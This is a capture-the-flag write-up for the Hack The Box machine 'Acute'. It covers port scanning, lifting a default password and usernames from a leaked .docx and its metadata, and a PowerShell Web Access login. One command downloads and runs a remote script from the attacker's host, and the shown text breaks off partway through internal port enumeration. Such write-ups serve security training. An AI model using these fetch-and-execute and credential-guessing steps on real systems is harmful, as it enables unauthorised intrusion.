<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.753884215312">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.5.0">

    <!-- Primary Meta Tags -->
    <title>Acute</title>
    <meta name="title" content="Acute">
    <meta name="description" content="IP: 10.10.11.145">

    <!-- Canonical -->
    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/acute/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/acute/">
    <meta property="og:title" content="Acute">
    <meta property="og:description" content="IP: 10.10.11.145">
    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/acute/images/acute.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/acute/">
    <meta property="twitter:title" content="Acute">
    <meta property="twitter:description" content="IP: 10.10.11.145">
    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/acute/images/acute.png">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../resources/css/retype.css?v=3.5.0.753884215312" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.753884215312" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.753884215312" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.753884215312" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
                                        </g>
                                    </svg>
                                    <span>HackTheBox</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                </g>
                                            </svg>
                                            <span>GitHub</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
                                                </g>
                                            </svg>
                                            <span>HackTheBox</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="acute" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#acute">#</doc-anchor-trigger>
        <span>Acute</span>
    </h1>
</doc-anchor-target>
<p><figure class="content-center">
    <img src="images/acute.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
IP: 10.10.11.145</p>
<doc-anchor-target id="nmap">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
        <span>Nmap</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="all-ports">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#all-ports">#</doc-anchor-trigger>
        <span>All ports</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.145 -v -Pn

PORT    STATE SERVICE
443/tcp open  https</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="version-and-scripts">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#version-and-scripts">#</doc-anchor-trigger>
        <span>Version and Scripts</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 443 10.10.11.145 -o nmap

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-03-25T00:09:06+00:00; +16m13s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
</doc-codeblock></div>
<p>Scanning the open ports we see only 443 open. We also notice the DNS <code v-pre>atsserver.acute.local</code>. Lets add it to our <code v-pre>/etc/hosts</code> file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">10.10.11.145    acute.local     atsserver.acute.local</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="port-443---https">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#port-443---https">#</doc-anchor-trigger>
        <span>Port 443 - HTTPS</span>
    </h2>
</doc-anchor-target>
<p>Browsing to <a href="https://10.10.11.145/">https://10.10.11.145/</a> we are given a 404 not found page. However, browsing to <a href="https://atsserver.acute.local/">https://atsserver.acute.local/</a> we are directed to &quot;Acute Health&quot; page:
<figure class="content-center">
    <img src="images/image1.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>If we go to <a href="https://atsserver.acute.local/about.html">https://atsserver.acute.local/about.html</a> it is possible to download a <code v-pre>.docx</code> file clicking in the &quot;New Starter Forms&quot; on the top right corner:
<figure class="content-center">
    <img src="images/image2.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>I will use <code v-pre>libreoffice</code> to open the file and read its contents:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ libreoffice New_Starter_CheckList_v7.docx

...[snip]...

The Universitys staff induction pages can be found at: https://atsserver.acute.local/Staff                                                                 
The Staff Induction portal can be found here: https://atsserver.acute.local/Staff/Induction

...[snip]...

Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this.

...[snip]...

Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage.

...[snip]...
    
Arrange for the new starter to meet with other staff in the department as appropriate. This could include the Head of Department and/or other members of the appointee’s team. Complete the [remote](https://atsserver.acute.local/Acute_Staff_Access) training

...[snip]...

**Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin. **</code></pre>
</doc-codeblock></div>
<p>The document seems to be a guide for a new employee. The important bits are:</p>
<ul>
<li>The default password and the administrator name</li>
<li>The PSWA (PowerShell WebAccess) session/configuration name <code v-pre>dc_manage</code></li>
<li>Remote training Acute_Staff_Access URL</li>
</ul>
<doc-anchor-target id="acute-staff-access">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#acute-staff-access">#</doc-anchor-trigger>
        <span>Acute Staff Access</span>
    </h3>
</doc-anchor-target>
<p>Accessing <a href="https://atsserver.acute.local/Acute_Staff_Access">https://atsserver.acute.local/Acute_Staff_Access</a>:
<figure class="content-center">
    <img src="images/image3.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>So we need username, password and computer name. So far we have default password. But we don’t have computer name.</p>
<p>Running <code v-pre>exiftool</code> in the <code v-pre>.docx</code> file we get a bit more information:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ exiftool New_Starter_CheckList_v7.docx                                                                                                                    
ExifTool Version Number         : 12.40                                                                                                                     
File Name                       : New_Starter_CheckList_v7.docx                                                                                             
Directory                       : .                                                                                                                         
File Size                       : 34 KiB                                                                                                                    
File Modification Date/Time     : 2022:03:25 08:08:19+08:00                                                                                                 
File Access Date/Time           : 2022:03:25 08:08:41+08:00                                                                                                 
File Inode Change Date/Time     : 2022:03:25 08:08:31+08:00                                                                                                 
File Permissions                : -rw-r--r--                                                                                                                
File Type                       : DOCX                                                                                                                      
File Type Extension             : docx                                                                                                                      
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document                                                   
Zip Required Version            : 20                                                                                                                        
Zip Bit Flag                    : 0x0006                                                                                                                    
Zip Compression                 : Deflated                                                                                                                  
Zip Modify Date                 : 1980:01:01 00:00:00                                                                                                       
Zip CRC                         : 0x079b7eb2                                                                                                                
Zip Compressed Size             : 428                                                                                                                       
Zip Uncompressed Size           : 2527                                                                                                                      
Zip File Name                   : [Content_Types].xml                                                                                                       
Creator                         : FCastle                                                                                                                   
Description                     : Created on Acute-PC01                                                                                                     
Last Modified By                : Daniel                                                                                                                    
Revision Number                 : 8                                                                                                                         
Last Printed                    : 2021:01:04 15:54:00Z                                                                                                      
Create Date                     : 2021:12:08 14:21:00Z                                                                                                      
Modify Date                     : 2021:12:22 00:39:00Z                                                                                                      
Template                        : Normal.dotm                                                                                                               
Total Edit Time                 : 2.6 hours                                                                                                                 
Pages                           : 3                                                                                                                         
Words                           : 886                                                                                                                       
Characters                      : 5055                                                                                                                      
Application                     : Microsoft Office Word                                                                                                     
Doc Security                    : None                                                                                                                      
Lines                           : 42                                                                                                                        
Paragraphs                      : 11                                                                                                                        
Scale Crop                      : No                                                                                                                        
Heading Pairs                   : Title, 1                                                                                                                  
Titles Of Parts                 :                                                                                                                           
Company                         : University of Marvel                                                                                                      
Links Up To Date                : No                                                                                                                        
Characters With Spaces          : 5930                                                                                                                      
Shared Doc                      : No                                                                                                                        
Hyperlinks Changed              : No                                                                                                                        
App Version                     : 16.0000</code></pre>
</doc-codeblock></div>
<p>The important details are:</p>
<ul>
<li>Description: Created on Acute-PC01</li>
<li>Creator: FCastle</li>
<li>Modified: Daniel
So we have 2 usernames and the computer name.</li>
</ul>
<p>If we come back to the About page, there is a list of employees:
<figure class="content-center">
    <img src="images/image4.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>If we try to follow the same username format that is in the <code v-pre>exiftool</code> &quot;Creator&quot; field we get:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">awallace
chall
edavies
imonks
jmorgan
lhopkins</code></pre>
</doc-codeblock></div>
<p>So now we have all the pieces to try to login at <a href="https://atsserver.acute.local/Acute_Staff_Access/">https://atsserver.acute.local/Acute_Staff_Access/</a>. After try and error we login as <code v-pre>edavies</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">User name: EDavies
Password: Password1!
Computer Name: Acute-PC01</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="pswa-as-edavies">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#pswa-as-edavies">#</doc-anchor-trigger>
        <span>PSWA as edavies</span>
    </h2>
</doc-anchor-target>
<p>We have a PowerShell session as <code v-pre>edavies</code>. Looking at the network configuration we can see that we are not in the main machine, but in a container:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">PS C:\Users\edavies\Documents&gt; ipconfig /all

Windows IP Configuration
   Host Name . . . . . . . . . . . . : Acute-PC01
   Primary Dns Suffix  . . . . . . . : acute.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : acute.local

Ethernet adapter Ethernet 2:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter #2
   Physical Address. . . . . . . . . : 00-15-5D-E8-0A-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14(Preferred) 
   IPv4 Address. . . . . . . . . . . : 172.16.22.2(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.22.1
   DHCPv6 IAID . . . . . . . . . . . : 251663709
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-29-1F-44-00-15-5D-E8-02-00
   DNS Servers . . . . . . . . . . . : 172.16.22.1
   NetBIOS over Tcpip. . . . . . . . : Enabled</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="enumerate-ports-open">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#enumerate-ports-open">#</doc-anchor-trigger>
        <span>Enumerate ports open</span>
    </h3>
</doc-anchor-target>
<p>I will use <a href="https://github.com/InfosecMatter/Minimalistic-offensive-security-tools">Minimalistic-offensive-security-tools</a> to enumerate the ports open:
In Kali</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 -m http.server 80</code></pre>
</doc-codeblock></div>
<p>In the PSWA</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.14/port-scan-tcp.ps1')</code></pre>
</doc-codeblock></div>
<p>IEX will download and load the script. If you try to download it and execute manually using curl or other method then it will not work.
Now run below command to start finding open ports on the gateway IP address:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">1..1024 | foreach { port-scan-tcp 172.16.22.1 $_ }</code></pre>
</doc-codeblock></div>
<p>After couple minutes we can check the open ports dumped into a txt file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">PS C:\Users\edavies\Documents&gt; type scanresults.txt | Select-String Open

172.16.22.1,tcp,53,Open
172.16.22.1,tcp,88,Open
172.16.22.1,tcp,135,Open
172.16.22.1,tcp,139,Open
172.16.22.1,tcp,389,Open
